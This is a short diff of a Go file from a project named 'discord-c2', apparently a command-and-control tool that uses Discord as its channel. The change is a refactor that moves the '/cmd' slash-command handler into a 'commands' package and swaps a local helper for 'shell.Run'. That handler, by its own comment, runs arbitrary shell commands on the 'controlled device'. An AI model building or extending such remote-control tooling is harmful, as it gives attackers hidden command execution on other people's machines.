@@ -1,12 +1,16 @@
-package main
+package commands
 
 // This file contains the /cmd slash command handler, which runs arbitrary
 // shell commands on the controlled device.
 
-import "github.com/bwmarrin/discordgo"
+import (
+	"discord-c2/internal/shell"
+
+	"github.com/bwmarrin/discordgo"
+)
 
 // handleSlashCmd extracts the command string from the interaction and runs it
-// via the shared runCommandString helper, replying with ephemeral status.
+// via shell.Run, replying with ephemeral status.
 func handleSlashCmd(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
 	var cmdStr string
 	for _, opt := range data.Options {
@@ -32,5 +36,5 @@ func handleSlashCmd(s *discordgo.Session, i *discordgo.InteractionCreate, data d
 			Flags:   discordgo.MessageFlagsEphemeral,
 		},
 	})
-	runCommandString(s, i.ChannelID, nil, cmdStr)
+	shell.Run(s, i.ChannelID, nil, cmdStr)
 }
